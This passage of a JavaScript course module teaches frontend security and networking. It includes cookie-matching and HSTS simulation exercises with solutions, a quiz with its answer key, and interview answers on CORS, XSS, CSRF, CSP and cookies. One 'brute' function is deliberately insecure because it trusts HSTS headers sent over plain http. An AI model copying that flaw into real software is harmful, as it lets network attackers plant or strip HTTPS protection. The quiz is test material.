  mcq: { q: "A cookie has path /cart. Which URL path receives it?", options: ["/cartoon", "/cart/view", "/car", "/"], answer: 1, explain: "Path matching works on boundaries: /cart/view matches, /cartoon does not." },
  hints: [`<p>Hint 1: Split the work: matching (domain, path, secure) first, then the SameSite decision, then ordering.</p>`,
    `<p>Hint 2: Compute crossSite once from the registrable domains and schemes of target and initiator.</p>`,
    `<p>Hint 3: Path rule: equal, or the request path starts with the cookie path and either the cookie path ends with '/' or the next request character is '/'.</p>`],
  solution: {
    approach: `<p>Implements the cookie jar retrieval algorithm in order: match, filter by Secure and SameSite, sort.</p>`,
    code: { lang: 'js', run: true, code: String.raw`function parts(url) { var u = new URL(url); return { scheme: u.protocol.slice(0, -1), host: u.hostname, path: u.pathname }; }
function site(host, publicSuffixes) {
  var labels = host.split('.'), n = 2;
  (publicSuffixes || []).forEach(function (s) { if (host === s || host.endsWith('.' + s)) n = s.split('.').length + 1; });
  return labels.slice(-n).join('.');
}
function domainMatches(c, host) { return c.hostOnly ? host === c.domain : (host === c.domain || host.endsWith('.' + c.domain)); }
function pathMatches(cp, rp) {
  if (rp === cp) return true;
  if (rp.indexOf(cp) !== 0) return false;
  return cp.charAt(cp.length - 1) === '/' || rp.charAt(cp.length) === '/';
}

function cookieHeader(jar, req, publicSuffixes) {
  var t = parts(req.url), ini = parts(req.initiator);
  var crossSite = site(t.host, publicSuffixes) !== site(ini.host, publicSuffixes) || t.scheme !== ini.scheme;
  var safe = req.method === 'GET' || req.method === 'HEAD';
  var picked = jar.filter(function (c) {
    if (!domainMatches(c, t.host) || !pathMatches(c.path, t.path)) return false;
    if (c.secure && t.scheme !== 'https' && t.host !== 'localhost') return false;
    var ss = c.sameSite || 'Lax';
    if (!crossSite || ss === 'None') return true;
    if (ss === 'Lax') return safe && req.topLevelNav === true;
    return false;                                              // Strict
  });
  picked.sort(function (a, b) { return b.path.length - a.path.length; });   // stable: older first on ties
  return picked.map(function (c) { return c.name + '=' + c.value; }).join('; ');
}

var jar = [
  { name: 'sid', value: 'S1', domain: 'shop.com', hostOnly: true, path: '/', secure: true, sameSite: 'Lax' },
  { name: 'pref', value: 'dark', domain: 'shop.com', hostOnly: false, path: '/', secure: false, sameSite: 'None' },
  { name: 'cart', value: 'C9', domain: 'shop.com', hostOnly: true, path: '/cart', secure: true, sameSite: 'Strict' },
  { name: 'ads', value: 'A', domain: 'tracker.net', hostOnly: false, path: '/', secure: true, sameSite: 'None' }
];
var R = function (o) { return cookieHeader(jar, o, []); };
console.log(R({ url: 'https://shop.com/cart/view', initiator: 'https://shop.com/', method: 'POST' }));
console.log(R({ url: 'https://api.shop.com/x', initiator: 'https://shop.com/', method: 'GET' }));
console.log(R({ url: 'https://shop.com/cart', initiator: 'https://blog.example/', method: 'GET', topLevelNav: true }));
console.log(R({ url: 'https://shop.com/cart', initiator: 'https://blog.example/', method: 'POST', topLevelNav: true }));
console.log(R({ url: 'http://shop.com/', initiator: 'http://shop.com/', method: 'GET' }));
console.log(R({ url: 'https://shop.com/cartoon', initiator: 'https://shop.com/', method: 'GET' }));
` },
    dry: { head: ["request", "matched", "sent"], rows: [["same-site POST /cart/view", "sid, pref, cart", "all 3"], ["cross-site POST", "sid, pref, cart", "pref only"], ["http://", "sid(Secure) dropped", "pref"]] },
    complexity: `<p>O(C log C) for C cookies (sorting).</p>`,
    followUps: ["Add Partitioned cookies keyed by top-level site.", "Add the Lax+POST two-minute exception and explain why not to rely on it."]
  }
});

practice.push({
  title: "Simulate HSTS Upgrades", level: "Hard", tags: ["HSTS", "HTTPS", "state machine"], companies: ["Cloudflare", "Mozilla"],
  statement: `<p>Write <code>simulateHsts(events)</code>. Each event is <code>{ t, url, header? }</code> (seconds, a full http/https URL, optional <code>Strict-Transport-Security</code> response header value). Keep a store of host entries. A request to <code>http://host</code> is upgraded to https (no plain request is sent) when the host has an unexpired entry, or a parent domain has an unexpired entry with <code>includeSubDomains</code>. The header is honoured only on responses received over https: <code>max-age=N</code> stores an entry until <code>t + N</code>, <code>max-age=0</code> deletes it. Return one line per event: <code>url -&gt; scheme [note]</code>.</p>`,
  constraints: `Up to 10<sup>4</sup> events, time non-decreasing.`,
  example: `<p>t=1 https with <code>max-age=100; includeSubDomains</code>; then t=50 <code>http://shop.com/a</code> and t=60 <code>http://api.shop.com/</code> are both upgraded; t=150 <code>http://shop.com/b</code> is a plain http request (entry expired).</p>`,
  brute: {
    why: `<p>Storing the header from any response, including plain http, lets a network attacker plant or delete HSTS state. A simpler flaw is forgetting expiry or includeSubDomains.</p>`,
    code: String.raw`function hstsBrute(events) {
  var seen = {};
  // Trusts the header on http too and never expires entries
  return events.map(function (e) { var h = e.url.split('/')[2]; if (e.header) seen[h] = true; return seen[h] ? 'https' : 'http'; });
}`
  },
  mcq: { q: "Why does the browser ignore Strict-Transport-Security received over plain http?", options: ["It is too long", "A network attacker could inject or alter it", "HTTP has no headers", "It would be cached"], answer: 1, explain: "Plain http responses can be forged on the network, so only headers received over authenticated TLS are trusted." },
  hints: [`<p>Hint 1: State is a map host to {expires, includeSubDomains}. Each event first decides the effective scheme, then may update the map.</p>`,
    `<p>Hint 2: To check coverage, walk the host's suffixes (api.shop.com, shop.com, com). The exact host needs only an unexpired entry; parents need includeSubDomains too.</p>`,
    `<p>Hint 3: Parse max-age with a small regex; max-age 0 deletes the entry. Only update the store when the effective scheme is https.</p>`],
  solution: {
    approach: `<p>A small state machine: decide the effective scheme from the store, then apply header updates only for secure responses.</p>`,
    code: { lang: 'js', run: true, code: String.raw`function simulateHsts(events) {
  var store = {};                                   // host -> { expires, sub }
  function covered(host, t) {
    var labels = host.split('.');
    for (var i = 0; i < labels.length; i++) {
      var h = labels.slice(i).join('.');
      var e = store[h];
      if (e && e.expires > t && (i === 0 || e.sub)) return true;
    }
    return false;
  }
  return events.map(function (ev) {
    var scheme = ev.url.slice(0, ev.url.indexOf(':'));
    var host = ev.url.replace(/^[a-z]+:\/\//, '').replace(/[\/:?#].*$/, '');
    var via = scheme;
    var note = '';
    if (scheme === 'http' && covered(host, ev.t)) { via = 'https'; note = 'upgraded by HSTS (no http request sent)'; }
    else if (scheme === 'http') note = 'plain http request sent (attackable)';
    if (via === 'https' && ev.header) {                   // STS only honoured on secure responses
      var ma = /max-age=(\d+)/i.exec(ev.header);
      if (ma) {
        var age = parseInt(ma[1], 10);
        if (age === 0) delete store[host];
        else store[host] = { expires: ev.t + age, sub: /includeSubDomains/i.test(ev.header) };
        note = (note ? note + '; ' : '') + (age === 0 ? 'HSTS entry removed' : 'HSTS stored for ' + age + 's');
      }
    } else if (scheme === 'http' && ev.header) note += ' (STS header on http ignored)';
    return ev.url + ' -> ' + via + (note ? ' [' + note + ']' : '');
  });
}
simulateHsts([
  { t: 0, url: 'http://shop.com/', header: 'max-age=100; includeSubDomains' },
  { t: 1, url: 'https://shop.com/', header: 'max-age=100; includeSubDomains' },
  { t: 50, url: 'http://shop.com/a' },
  { t: 60, url: 'http://api.shop.com/' },
  { t: 150, url: 'http://shop.com/b' },
  { t: 151, url: 'https://shop.com/', header: 'max-age=0' },
  { t: 152, url: 'http://shop.com/c' }
]).forEach(function (l) { console.log(l); });
` },
    dry: { head: ["t", "url", "result"], rows: [["0", "http://shop.com/", "plain http, header ignored"], ["1", "https://shop.com/", "stored 100s"], ["50", "http://shop.com/a", "upgraded"]] },
    complexity: `<p>O(L) per event for L host labels.</p>`,
    followUps: ["How does the preload list change the first visit?", "What are the risks of includeSubDomains; preload?"]
  }
});


/* ============================ QUIZ ============================ */
quiz.push({ q: 'Which pair of URLs is SAME-ORIGIN?', options: ['https://shop.com/a and http://shop.com/a', 'https://shop.com/a and https://shop.com:443/b?x=1', 'https://shop.com and https://api.shop.com', 'https://shop.com and https://shop.com:8443'], answer: 1, explain: 'Scheme, host and port all match (443 is the https default). Path and query never matter.' });
quiz.push({ q: 'What does the Same-Origin Policy mainly block?', options: ['Sending any request to another origin', 'Reading the response of a cross-origin request from script', 'Loading images from other sites', 'Submitting forms to other sites'], answer: 1, explain: 'Requests can often be sent (forms, images), but script cannot read the cross-origin response unless the server opts in via CORS.' });
quiz.push({ q: 'Which request triggers a CORS preflight?', options: ['GET with no custom headers', 'POST with Content-Type: application/x-www-form-urlencoded', 'POST with Content-Type: application/json', 'HEAD with Accept header'], answer: 2, explain: 'application/json is not a CORS-safelisted content type, so the browser sends OPTIONS first.' });
quiz.push({ q: 'A credentialed fetch gets "Access-Control-Allow-Origin: *". Result?', options: ['Works', 'Blocked: the wildcard is not allowed with credentials', 'Cookies are dropped but response is readable', 'Preflight is skipped'], answer: 1, explain: 'With credentials the server must return the exact origin plus Access-Control-Allow-Credentials: true.' });
quiz.push({ q: 'Which cookie flag stops injected JavaScript from reading the session id?', options: ['Secure', 'SameSite=Strict', 'HttpOnly', 'Path=/'], answer: 2, explain: 'HttpOnly hides the cookie from document.cookie. Secure is about HTTPS, SameSite about cross-site sending.' });
quiz.push({ q: 'A form on evil.com posts to bank.com. The session cookie is SameSite=Lax. Is the cookie sent?', options: ['Yes, always', 'No, Lax cookies are not sent on cross-site POSTs', 'Only if HttpOnly', 'Only over HTTP'], answer: 1, explain: 'Lax sends cookies only on same-site requests and cross-site top-level GET navigations.' });
quiz.push({ q: 'Which is DOM-based XSS?', options: ['Comment stored in the database and rendered by the server', 'Search term echoed by the server in the response', 'Client code writes location.hash into innerHTML', 'An expired TLS certificate'], answer: 2, explain: 'DOM XSS happens entirely in client-side code moving a source (location.hash) to a sink (innerHTML); the server never sees the payload.' });
quiz.push({ q: 'Which output encoding is correct for text placed inside a quoted HTML attribute?', options: ['encodeURIComponent only', 'HTML-escape including quotes', 'Remove the word script', 'Base64'], answer: 1, explain: 'Quotes must be escaped to prevent breaking out of the attribute, along with &, < and >.' });
quiz.push({ q: 'What is the best protection against CSRF on a cookie-session site?', options: ['CORS headers', 'SameSite cookies plus anti-CSRF tokens or Origin checks', 'Hiding the URL', 'Using GET for actions'], answer: 1, explain: 'CORS does not stop form posts. Use SameSite and a token or Origin/Sec-Fetch-Site validation, and never change state on GET.' });
quiz.push({ q: 'Which CSP makes injected inline scripts fail but keeps your own nonced scripts working?', options: ["script-src * 'unsafe-inline'", "script-src 'self' 'nonce-R4nd0m'", "default-src *", "script-src 'unsafe-eval'"], answer: 1, explain: "A per-response nonce lets only tagged scripts run. 'unsafe-inline' and wildcards defeat the purpose." });
quiz.push({ q: 'Which header prevents your page from being embedded in an attacker’s iframe?', options: ['Content-Security-Policy: frame-ancestors \'none\'', 'Access-Control-Allow-Origin: none', 'Referrer-Policy: no-referrer', 'Set-Cookie: SameSite=None'], answer: 0, explain: 'frame-ancestors controls who may frame your page (X-Frame-Options is the legacy equivalent).' });
quiz.push({ q: 'Where does an XSS attacker NOT get a portable, reusable credential?', options: ['localStorage', 'sessionStorage', 'An HttpOnly cookie', 'A global JS variable'], answer: 2, explain: 'HttpOnly cookies cannot be read or exported by script. The attacker can still act from the victim browser while the XSS lasts.' });
quiz.push({ q: 'Why can HTTP/3 outperform HTTP/2 on lossy mobile networks?', options: ['It uses bigger images', 'QUIC streams recover independently, so one lost packet does not stall all streams', 'It disables TLS', 'It opens six TCP connections'], answer: 1, explain: 'HTTP/2 over TCP suffers TCP head-of-line blocking; QUIC tracks loss per stream.' });
quiz.push({ q: 'An https page includes &lt;script src="http://cdn.example/a.js"&gt;. What happens?', options: ['Loads normally', 'The browser blocks it as mixed active content', 'It is silently cached', 'It runs with fewer permissions'], answer: 1, explain: 'Active mixed content (scripts, iframes, fetch) is blocked. Passive content like images is usually upgraded.' });

/* ============================ INTERVIEW ============================ */
interview.push({ q: 'Explain the Same-Origin Policy. What counts as an origin and what exactly does it block?', level: 'B', a: `<p>An origin is scheme + host + port. Two URLs are same-origin only if all three match; path and query are ignored. The policy lets a page <em>embed</em> and <em>send</em> to other origins (images, scripts, forms, links) but prevents script from <em>reading</em> cross-origin responses, DOM of other-origin frames, and other origins’ storage. Example: a page on https://app.com cannot read the JSON that https://api.com returns unless api.com sends CORS headers allowing app.com.</p><p>Common follow-up traps: http vs https differ; subdomains differ; localhost:3000 vs localhost:8080 differ; same-site is a looser idea (registrable domain) used by cookies.</p>`, followUps: ['Same-origin vs same-site?', 'How do two windows legitimately communicate across origins?', 'What is an opaque origin?'] });
interview.push({ q: 'Walk me through a CORS preflight. When does it happen and what must the server return?', level: 'B', a: `<p>A request is "simple" if the method is GET/HEAD/POST, headers are only safelisted ones, and the Content-Type is form-like. Anything else, such as PUT/DELETE, JSON bodies, or Authorization/custom headers, triggers an automatic OPTIONS request with Origin, Access-Control-Request-Method and Access-Control-Request-Headers, sent without cookies. The server must answer 2xx with Access-Control-Allow-Origin, Allow-Methods and Allow-Headers covering the real request (and optionally Max-Age to cache it). Only then does the browser send the real request, whose response again needs Allow-Origin.</p><p>If the preflight fails the real request is never sent.</p>`, followUps: ['Why does JSON POST need one but form POST not?', 'How can you reduce preflight cost?', 'Why does my OPTIONS return 401?'] });
interview.push({ q: 'Your API works in Postman but fails in the browser with a CORS error. How do you debug and fix it?', level: 'B', a: `<p>CORS is enforced by browsers only, so Postman and curl succeed. In DevTools Network I check the OPTIONS request: status must be 2xx and it must not be redirected or blocked by auth middleware. Then I compare headers: Access-Control-Allow-Origin must equal the page origin exactly, Allow-Headers must list every requested header, and for cookies the response needs Allow-Credentials: true with a specific origin, never a wildcard. I also check that only one layer (gateway or app) adds the headers, since duplicates are rejected, and that Vary: Origin is set.</p><p>The fix lives on the server (or a same-origin proxy), never in the frontend code or by disabling browser security.</p>`, followUps: ['What if a CDN caches the response?', 'How would you set this up in dev vs prod?'] });
interview.push({ q: 'What do HttpOnly, Secure and SameSite do, and which would you set on a session cookie?', level: 'B', a: `<p>HttpOnly hides the cookie from JavaScript, limiting theft via XSS. Secure restricts it to HTTPS, preventing sniffing and downgrade leaks. SameSite controls cross-site sending: Strict never, Lax only for top-level GET navigations, None always (requires Secure). For a normal session cookie I use <code>__Host-sid; Path=/; Secure; HttpOnly; SameSite=Lax</code> with a sensible Max-Age, regenerate the id at login to prevent fixation, and add CSRF tokens for state-changing requests. The __Host- prefix forces Secure, Path=/ and no Domain so sibling subdomains cannot overwrite it.</p>`, followUps: ['When would you pick Strict?', 'When is SameSite=None required?', 'What are third-party cookies and where do they stand?'] });
interview.push({ q: 'Describe the three types of XSS and how you prevent each.', level: 'I', a: `<p>Stored XSS: payload saved on the server (comments, profiles) and served to every viewer. Reflected: payload in the request (query string) echoed in the response. DOM-based: client-side code moves attacker-controlled data (location, postMessage) into a dangerous sink such as innerHTML or eval.</p><p>Prevention is layered: render data as text (textContent, framework bindings), encode output for its context, avoid dangerous sinks, sanitize necessary rich HTML with an allowlist library like DOMPurify, validate URL schemes, then add a strict CSP, Trusted Types and HttpOnly cookies as backstops.</p>`, followUps: ['Why is escaping on output better than on input?', 'Is React immune?', 'What is mutation XSS?'] });
interview.push({ q: 'Is storing a JWT in localStorage a good idea? What are the alternatives?', level: 'I', a: `<p>localStorage is simple but any XSS can read the token and use it from anywhere until it expires, and it has no built-in expiry or revocation. HttpOnly cookies cannot be exported by script but need CSRF protection (SameSite plus token). Good patterns: first-party session cookie; short-lived access token in memory with a rotating HttpOnly refresh cookie; or a BFF that keeps OAuth tokens server-side. I decide by data sensitivity, whether the API shares a site with the UI, and how strong my XSS defences are (CSP, Trusted Types).</p><p>No option is XSS-proof because injected script can still call the API during the attack; storage choice limits what can be stolen and for how long.</p>`, followUps: ['How does refresh-token rotation detect theft?', 'What changes for a native app?', 'Why is the implicit OAuth flow deprecated?'] });
interview.push({ q: 'What is CSRF, why does the Same-Origin Policy not prevent it, and how do you defend?', level: 'I', a: `<p>CSRF makes a logged-in victim’s browser send a forged state-changing request, relying on cookies being attached automatically. SOP does not help because it blocks reading responses, not sending requests; the attacker does not need the answer. Defences: SameSite=Lax/Strict cookies, anti-CSRF tokens (synchronizer or signed double-submit), verifying Origin or Sec-Fetch-Site, requiring custom headers or JSON content type with CORS, never changing state on GET, and re-authentication for sensitive actions.</p>`, followUps: ['Why does a CSRF token not help against XSS?', 'Does a JSON API need CSRF protection?', 'What is login CSRF?'] });
interview.push({ q: 'What is a Content Security Policy and how would you roll one out on an existing site?', level: 'I', a: `<p>CSP is a response header that tells the browser which sources of scripts, styles, images, frames and connections are allowed, mitigating XSS and data exfiltration. I would start with Content-Security-Policy-Report-Only and a reporting endpoint, fix inline scripts and handlers (move to files or add per-response nonces), list real API and image origins, then enforce. The target is a strict policy: <code>script-src 'nonce-...' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'</code>. I avoid unsafe-inline, wildcards and long host allowlists that are bypassable.</p>`, followUps: ['Why are nonces better than host allowlists?', 'What breaks with third-party tags?', 'What is Trusted Types?'] });
interview.push({ q: 'What is clickjacking and how do you stop it? How is it different from CSRF?', level: 'I', a: `<p>Clickjacking loads your real page in a transparent iframe above a decoy so the user performs a genuine click on your UI unknowingly. CSRF forges a request without the user interacting with your page. Because the click is real, CSRF tokens and SameSite do not help. Defence is controlling framing: <code>Content-Security-Policy: frame-ancestors 'none'</code> (or a list of partner origins) plus legacy <code>X-Frame-Options: DENY</code>; for critical actions require a confirmation or re-authentication step.</p>`, followUps: ['Why are JavaScript frame-busters unreliable?', 'How do you allow one partner to embed you?'] });
interview.push({ q: 'Why is HTTP/2 faster than HTTP/1.1, and what does HTTP/3 fix?', level: 'I', a: `<p>HTTP/1.1 handles one request at a time per connection, so browsers open about six connections and requests queue behind slow ones. HTTP/2 multiplexes many streams over one connection, compresses headers (HPACK) and has priorities, removing HTTP-level head-of-line blocking. But it runs on TCP, so a single lost packet stalls all streams. HTTP/3 uses QUIC over UDP with per-stream loss recovery, faster handshakes (1-RTT, 0-RTT resumption) and connection migration across networks.</p><p>Frontend consequences: no domain sharding, sensible bundle splitting, preload and fetchpriority instead of server push.</p>`, followUps: ['How does a browser discover HTTP/3?', 'What is the risk of 0-RTT?', 'Does bundling still matter?'] });
interview.push({ q: 'How do HSTS, mixed-content blocking and Subresource Integrity work together?', level: 'A', a: `<p>HSTS tells the browser to only use HTTPS for a host for max-age seconds (optionally subdomains and preload), closing the SSL-stripping window on the first plain-http request. Mixed-content blocking stops an HTTPS page from loading active http subresources, and upgrade-insecure-requests can rewrite legacy links. SRI adds an integrity hash to a script or stylesheet tag so a compromised CDN cannot silently change the file. Together they defend the transport (HSTS), the page composition (mixed content) and third-party code integrity (SRI). Roll out HSTS gradually; preload is hard to undo.</p>`, followUps: ['What is the HSTS preload list?', 'What does SRI require from the CDN response?'] });
interview.push({ q: 'A security review says your CORS config reflects any Origin and sets Allow-Credentials: true. Explain the risk and the fix.', level: 'A', a: `<p>Reflecting arbitrary Origins with credentials turns CORS into a bypass of the Same-Origin Policy: any website a logged-in user visits can fetch your API with their cookies and read the responses (personal data, CSRF tokens, API keys). The fix is a strict allowlist of exact origins (parsed and compared as whole origins, never regex or endsWith), echo only matches, add Vary: Origin, avoid allowing null, review whether wildcard subdomains are trustworthy (takeover risk), and prefer a same-origin gateway where possible. Add tests that send a hostile Origin and assert no Allow-Origin header is returned.</p>`, followUps: ['Why is the null origin dangerous?', 'What if the API has no cookies, only bearer tokens?'] });
interview.push({ q: 'Design the client-side security posture for a new banking SPA. What headers, cookies and patterns do you choose?', level: 'E', a: `<p>Architecture: BFF on the same site as the UI, so the browser holds only an HttpOnly, Secure, SameSite=Lax <code>__Host-</code> session cookie; OAuth tokens stay server-side (authorization code + PKCE). CSRF: SameSite plus token and Origin/Sec-Fetch-Site validation. XSS: framework auto-escaping, a lint ban on dangerouslySetInnerHTML without DOMPurify, strict nonce-based CSP with object-src none, base-uri none, Trusted Types enforced, no third-party scripts on authenticated pages (or SRI and isolation in iframes). Framing: frame-ancestors none. Transport: TLS 1.2+, HSTS with preload, upgrade-insecure-requests. Isolation: COOP same-origin, CORP, Referrer-Policy strict-origin-when-cross-origin, Permissions-Policy denying unused features. Sessions: short idle and absolute timeouts, rotation on login and privilege change, step-up auth for transfers, device binding where available. Observability: CSP and Reporting API endpoints, anomaly alerts, dependency scanning for the supply chain.</p>`, followUps: ['What would you cut for an internal tool?', 'How do you test that these controls stay in place?', 'How do passkeys change the login design?'] });

registerModule({
  id: 'fe13',
  title: 'Frontend Security & Networking',
  intro: `<p>Almost every serious web bug is a trust bug: the browser trusted data it should not have, or a server trusted a request it could not verify. In this module you learn the rules the browser enforces (the Same-Origin Policy, CORS, cookie flags), the attacks that exploit mistakes (XSS, CSRF, clickjacking), the defences that fix them (escaping, CSP, tokens, SameSite, frame-ancestors) and the network layer underneath (HTTPS, HTTP/2, HTTP/3). Every topic starts with an everyday analogy, then a visual step-by-step walk-through, runnable code and interview-style practice. It follows <b>Rendering Pipeline</b> and <b>React Internals</b> and prepares you for frontend system design and any senior frontend interview.</p>`,
  goals: [
    'Decide in seconds whether two URLs are same-origin or same-site, and explain what the Same-Origin Policy does and does not block',
    'Explain CORS including preflight, predict which requests preflight, and fix a CORS error at the right layer',
    'Choose cookie flags (HttpOnly, Secure, SameSite, __Host-) for any session or embed scenario',
    'Spot and fix stored, reflected and DOM XSS using context-aware escaping, sanitizers, CSP and Trusted Types',
    'Defend a form or API against CSRF with SameSite, tokens and Origin / Fetch Metadata checks',
    'Write a CSP and clickjacking headers for a given app, and roll them out safely',
    'Argue localStorage vs HttpOnly cookie vs BFF for token storage with clear trade-offs',
    'Explain HTTPS, HSTS, mixed content, SRI, and how HTTP/1.1, HTTP/2 and HTTP/3 change frontend performance habits'
  ],
  prereqs: `Frontend modules <b>Browser APIs, Storage &amp; Networking</b> (fetch, cookies, storage) and <b>DOM &amp; Events</b>; basic JavaScript. Comfortable reading HTTP headers helps.`,
  hours: 14,
  topics: topics,
  quiz: quiz,
  interview: interview,
  practice: practice
});
})();
